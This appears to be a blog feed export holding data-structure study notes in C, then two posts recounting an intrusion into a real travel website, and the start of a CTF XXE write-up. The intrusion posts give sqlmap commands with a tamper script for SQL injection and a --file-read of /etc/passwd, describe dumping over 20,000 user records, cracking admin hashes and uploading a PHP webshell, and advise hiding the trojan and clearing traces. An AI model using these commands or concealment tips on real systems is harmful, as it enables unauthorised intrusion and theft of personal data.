data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529170658268.png"  alt="image-20200529170625502" style="zoom: 67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//结点的数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">prior</span>;</span><span class="comment">//指向直接前驱</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">next</span>;</span><span class="comment">//指向直接后继</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;</span><br></pre></td></tr></table></figure><h2 id="shun-xu-zhan" id="顺序栈"><a class="header-anchor" href="#顺序栈">¶</a>顺序栈</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171934385.png"  alt="image-20200529172642776" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100<span class="comment">//顺序栈存储空间的初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;<span class="comment">//栈底指针</span></span><br><span class="line">    SElemType *top;<span class="comment">//栈顶指针</span></span><br><span class="line">    <span class="keyword">int</span> stacksize;<span class="comment">//栈可用的最大容量</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><p>栈空：S.top==S.base//首尾指针相同</p><p>栈满：S.top-S.base==S.stacksize//尾-首等于最大容量即为满</p><h2 id="lian-zhan" id="链栈"><a class="header-anchor" href="#链栈">¶</a>链栈</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529171646363.png"  alt="image-20200529171934385" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义类似，类似操作受限的单链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span><span class="comment">//指向下一结点</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br></pre></td></tr></table></figure><p>链栈一定是没有头结点，所以栈空的条件为：S==NULL</p><h2 id="xun-huan-dui-lie" id="循环队列"><a class="header-anchor" href="#循环队列">¶</a>循环队列</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529172331805.png"  alt="image-20200529171646363" style="zoom: 50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100 <span class="comment">//队列可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;<span class="comment">//存储空间的基地址</span></span><br><span class="line">    <span class="keyword">int</span> front;<span class="comment">//头指针（只是有指针的作用,例如用Q.base[Q.front]取元素）</span></span><br><span class="line">    <span class="keyword">int</span> rear;<span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>队空：Q.front==Q.rear//首尾指针相同</p><p>//尾指针指向的为最后一个元素的下一个地址(永远为空)，所以+1</p><p>队满：(Q.rear+1)%MAXSIZE==Q.front</p><h2 id="lian-dui" id="链队"><a class="header-anchor" href="#链队">¶</a>链队</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200529172642776.png"  alt="image-20200529172331805" style="zoom: 67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只看第一个定义和单链表类似，不同的是第二个设了队头和队尾指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span><span class="comment">//指向下一结点</span></span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QueuePtr front;<span class="comment">//队头指针(相等于QNode *front)</span></span><br><span class="line">    QueuePtr rear;<span class="comment">//队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><p>队空：Q.front=Q.rear</p><p>由于串、数组、广义表的存储结构不是重点在这里就不再列出其存储结构</p><h2 id="xiao-jie" id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h2><p>栈和队列除了链栈都有头尾指针</p><h2 id="shun-xu-er-cha-shu-bu-chang-yong" id="顺序二叉树-不常用"><a class="header-anchor" href="#顺序二叉树-不常用">¶</a>顺序二叉树(不常用)</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-100.png"  alt="image-100" style="zoom:67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100<span class="comment">//二叉树的最大结点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> TElemType SqBiTree[MAXSIZE]<span class="comment">//0号存储根结点</span></span><br><span class="line">SqBiTree bt;</span><br></pre></td></tr></table></figure><h2 id="er-cha-lian-biao-chang-yong" id="二叉链表-常用"><a class="header-anchor" href="#二叉链表-常用">¶</a>二叉链表(常用)</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-102.png"  alt="image-102" style="zoom:67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">TElemType data;<span class="comment">//结点数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span><span class="comment">//左右孩子指针</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><h2 id="xian-suo-er-cha-shu" id="线索二叉树"><a class="header-anchor" href="#线索二叉树">¶</a>线索二叉树</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-103.png"  alt="image-103" style="zoom:67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span><span class="comment">//左右孩子指针</span></span><br><span class="line">    <span class="keyword">int</span> LTag,RTag;<span class="comment">//左右标志</span></span><br><span class="line">&#125;BiThrNode,*BiThrTree;</span><br></pre></td></tr></table></figure><h2 id="hai-zi-xiong-di-er-cha-shu" id="孩子兄弟二叉树"><a class="header-anchor" href="#孩子兄弟二叉树">¶</a>孩子兄弟二叉树</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-104.png"  alt="image-104" style="zoom:67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tyrpedef <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>//又称二叉链表表示，本质存的是树用类似存二叉树的方法存</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span><span class="comment">//即左是孩子右是兄弟</span></span><br><span class="line">&#125;CSNode,*CSTree;</span><br></pre></td></tr></table></figure><h2 id="lin-jie-ju-zhen" id="邻接矩阵"><a class="header-anchor" href="#邻接矩阵">¶</a>邻接矩阵</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606155925297.png"  alt="image-20200606155925297" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxInt 32767   <span class="comment">//表示极大值，即∞</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MVNum 100       <span class="comment">//最大顶点数 </span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> VertexType;   <span class="comment">//假设顶点的数据类型为字符型 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ArcType;       <span class="comment">//假设边的权值类型为整型 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">  VertexType vexs[MVNum];       <span class="comment">//顶点表 </span></span><br><span class="line">  ArcType arcs[MVNum][MVNum];   <span class="comment">//邻接矩阵 </span></span><br><span class="line">  <span class="keyword">int</span> vexnum,arcnum; <span class="comment">//图的顶点数和边数 </span></span><br><span class="line">&#125;AMGraph;</span><br></pre></td></tr></table></figure><h2 id="lin-jie-biao" id="邻接表"><a class="header-anchor" href="#邻接表">¶</a>邻接表</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606160127426.png"  alt="image-20200606160127426" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意存的是顶点数组下标不是存的顶点本身</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>  <span class="title">ArcNode</span> &#123;</span>   <span class="comment">//边结构</span></span><br><span class="line">      <span class="keyword">int</span>  adjvex;                              <span class="comment">//该边所指向的顶点位置</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span>  <span class="title">ArcNode</span> *<span class="title">nextarc</span>;</span>   <span class="comment">//指向下一条边的指针</span></span><br><span class="line">      OtherInfo    info;                     <span class="comment">//和边相关的信息</span></span><br><span class="line">&#125; ArcNode；</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MVNum 100</span></span><br><span class="line"><span class="keyword">typedef</span>   <span class="class"><span class="keyword">struct</span>  <span class="title">VNode</span>&#123;</span> <span class="comment">//顶点结构</span></span><br><span class="line">     VertexType   data;              <span class="comment">//顶点信息</span></span><br><span class="line">     ArcNode   * firstarc;         <span class="comment">//指向依附该顶点的第一条弧的指针</span></span><br><span class="line">&#125; VNode, AdjList[MVNum];  </span><br><span class="line"><span class="keyword">typedef</span>   <span class="class"><span class="keyword">struct</span> &#123;</span>                 <span class="comment">//图结构</span></span><br><span class="line">      AdjList   vertics ;           <span class="comment">//邻接表</span></span><br><span class="line">      <span class="keyword">int</span>  vexnum, arcnum;  <span class="comment">//顶点数和弧数</span></span><br><span class="line">      <span class="keyword">int</span>  kind;                       <span class="comment">//图的种类</span></span><br><span class="line">&#125;  ALGraph;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;为迎接期末，总结了下知识点，供个人复习使用，仅供参考。&lt;/p&gt;
&lt;p&gt;本文用到的复习资料：&lt;a href=&quot;https://pan.baidu.com/s/1M5zHduugp_MMGL9VuNNxY
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="计算机专业课" scheme="http://zssblog.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="计算机专业课" scheme="http://zssblog.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>某旅游网站子站存在上传漏洞已拿下服务器</title>
    <link href="http://zssblog.top/2020/05/25/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99%E5%AD%90%E7%AB%99%E5%AD%98%E5%9C%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B7%B2%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://zssblog.top/2020/05/25/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99%E5%AD%90%E7%AB%99%E5%AD%98%E5%9C%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B7%B2%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-05-25T07:36:00.000Z</published>
    <updated>2020-05-31T10:10:36.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qian-yan">前言</h1><p>上篇文章：<a href="http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/">某旅游网站sql注入导致泄露2万多个人信息</a>已经找到了sql注入点拿到了数据库，但始终拿不到shell,经过探索，在一子站找到了上传点。</p><p>已成功上传拿到了服务器</p><p>但是！！！</p><p>由于没经验上传了木马到服务器没管第二天发现木马被删了，木马上传页面也被禁止访问了，补天因此没收录</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/%E4%B8%8B%E8%BD%BD.jpeg"  alt="下载"></p><p>咳咳，出于学习为主的原因，还是写了这篇文章(一个高危就这样溜了，哭泣.jpg)</p><h1 id="lou-dong-miao-shu">漏洞描述</h1><p>子站 <a href="http://cs.xxxxxx.cn" target="_blank" rel="noopener">http://cs.xxxxxx.cn</a> 一客服管理系统可任意注册客服用户，聊天页面可上传shell，已拿下服务器。</p><h1 id="lou-dong-xiang-qing">漏洞详情</h1><p>在 <a href="http://cs.xxxxx.cn" target="_blank" rel="noopener">http://cs.xxxxx.cn</a> 页面源代码处发现注册页面，随便注册用户1成功注册，会给个专属聊天链接 <a href="http://cs.xxxxx.cn/index.php/Index/admin?kf=149806532" target="_blank" rel="noopener">http://cs.xxxxx.cn/index.php/Index/admin?kf=149806532</a></p><p>打开链接是一个聊天页面，没有上传文件选项，但是可以上传图片</p><p>聊天界面上传图片，抓包改为将image/jpeg改为php,base64编码一句话木马成功上传</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/f24238293cfc5895b4a6906fad7bc030d0e2f8804a8c5.png"  alt="img"></p><p>连接shell成功连接</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/1.png"  alt="4"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/4.png"  alt="1"></p><p>可任意下载修改文件，执行mysql命令</p><h1 id="xie-zai-zui-hou">写在最后</h1><p>如果你恰巧看到了这篇文章，建议如果以后你上传了木马后测试可以的话就立马删除木马，清理所有痕迹(问的一群里大佬)。</p><p>清理了痕迹他们就不那么容易发现木马，而且补天审核还真的不是一般慢(两个星期)，他们收到你的漏洞后会再测下的，如果不能测试成功，那审核就不能通过，所以还是把木马藏好点保险。</p><p>还好有个任意用户登录漏洞被收录了，给了个中危。</p><p>清理痕迹，血的教训！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qian-yan&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;上篇文章：&lt;a href=&quot;http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>某旅游网站sql注入导致泄露2万多个人信息</title>
    <link href="http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/"/>
    <id>http://zssblog.top/2020/05/22/%E6%9F%90%E6%97%85%E6%B8%B8%E7%BD%91%E7%AB%99sql%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E6%B3%84%E9%9C%B22%E4%B8%87%E5%A4%9A%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</id>
    <published>2020-05-22T14:34:00.000Z</published>
    <updated>2020-05-31T10:10:45.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shuo-ming">说明</h1><p>测试目标是一个旅游网站，发现了sql注入漏洞，泄露2万多用户信息，可任意下载服务器上文件。</p><p>所有可利用信息均打码处理。</p><h1 id="shen-tou-guo-cheng">渗透过程</h1><p>正常搜索没啥问题</p><p>但是当我们输入1’就会报错</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513141839168.png"  alt="image-20200513141920454"></p><p>尝试注释闭合，发现失败</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513141920454.png"  alt="image-20200513141839168"></p><p>尝试不注释闭合后面的</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142028584.png"  alt="image-20200513142028584"></p><p>后来多次尝试找到了问题所在</p><p>当我们把空格替换为/**/发现搜到了内容</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142322134.png"  alt="image-20200513142322134"></p><p>直接上sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;search&#x2F;cloudsearch?keyword&#x3D;1&amp;typeid&#x3D;0&quot; --level 3 -p keyword --tamper space2comment.py</span><br></pre></td></tr></table></figure><p>发现了好几个注入漏洞</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142514633.png"  alt="image-20200513144740433"></p><p>尝试列数据库，发现60多数据库</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/2.png"  alt="2"></p><p>查看当前数据库根据名字看到是一个cms</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513142852619.png"  alt="image-20200513142852619"></p><p>谷歌搜下这个cms发现没啥爆出来的漏洞，看下cms数据库的结构</p><p>找到了会员表</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143035131.png"  alt="image-20200513142514633"></p><p>看下发现有2万多数据</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200512171651702.png"  alt="image-20200513144553013"></p><p>查看了下部分数据，可看到密码是MD5加密</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143239226.png"  alt="image-20200512171651702"></p><p>MD5破解后，成功登录</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143327053.png"  alt="image-20200513143035131"></p><h1 id="jin-yi-bu-li-yong-lou-dong">进一步利用漏洞</h1><p>我们已经得到了了其用户账号和密码，我们想进一步利用</p><h2 id="deng-lu-zi-zhan-hou-tai" id="登录子站后台"><a class="header-anchor" href="#登录子站后台">¶</a>登录子站后台</h2><p>查看cms表结构找到其admin表</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143537261.png"  alt="image-20200513143537261"></p><p>密码一看就是MD5尝试破解</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513143623963.png"  alt="image-20200513143239226"></p><p>拿到了管理员密码，按理说我们应该尝试登录其后台，但是经扫描各种方法尝试也没找到它后台在哪，无奈放弃。</p><p>用subdomainsbrute 扫描子站，发现有个WordPress的博客</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144008090.png"  alt="image-20200513144008090"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144048053.png"  alt="image-20200513122737322"></p><p>首页后缀输入/login直接跳转到后台登录页面，用我们刚才得到的管理员数据直接登录成功</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513122737322.png"  alt="image-20200513144008090"></p><h2 id="fu-wu-qi-ren-yi-wen-jian-xia-zai" id="服务器任意文件下载"><a class="header-anchor" href="#服务器任意文件下载">¶</a>服务器任意文件下载</h2><p>以前打CTF不知道sqlmap还能下载文件，之前都是得到数据库看数据找flag</p><p>这也是但是网上搜如何进一步利用漏洞发现的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;xxxxx&#x2F;search&#x2F;cloudsearch?keyword&#x3D;1&amp;typeid&#x3D;0&quot; --level 3 -p keyword --tamper space2comment.py --file-read&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>去看下文件，成功下载</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144553013.png"  alt="image-20200513143623963"></p><p>另外我发现它首页如果访问一个不存在的控制器会报错，根据报错信息可以找到其根目录的绝对路径</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200513144740433.png"  alt="image-20200513144048053"></p><p>根据网站根目录可下载网站文件，这里就没再尝试了</p><h1 id="na-shell">拿shell??</h1><p>网上说sqlmap可用–os-shell且知道网站根目录可拿shell,上面我们已经得到了网站根目录路径，尝试了下拿shell，失败，卒。。。</p><p>后来在它一个客服系统子站找到了一个上传漏洞，拿到了shell,详情见下一篇博客。</p><h1 id="xie-zai-zui-hou">写在最后</h1><p>这次渗透收获颇丰，也是这个站防护太差才让我这个小菜鸡都能渗透进去的，hahaha。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shuo-ming&quot;&gt;说明&lt;/h1&gt;
&lt;p&gt;测试目标是一个旅游网站，发现了sql注入漏洞，泄露2万多用户信息，可任意下载服务器上文件。&lt;/p&gt;
&lt;p&gt;所有可利用信息均打码处理。&lt;/p&gt;
&lt;h1 id=&quot;shen-tou-guo-cheng&quot;&gt;渗透过程&lt;/h1&gt;
&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF XXE漏洞攻击</title>
    <link href="http://zssblog.top/2020/05/07/CTF-XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"/>
    <id>http://zssblog.top/2020/05/07/CTF-XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</id>
    <published>2020-05-07T07:58:00.000Z</published>
    <updated>2020-05-31T10:12:08.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fake-xml-cookbook">Fake XML Cookbook</h1><p>F12 查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="keyword">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> <span class="params">(result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">"code"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">"msg"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span 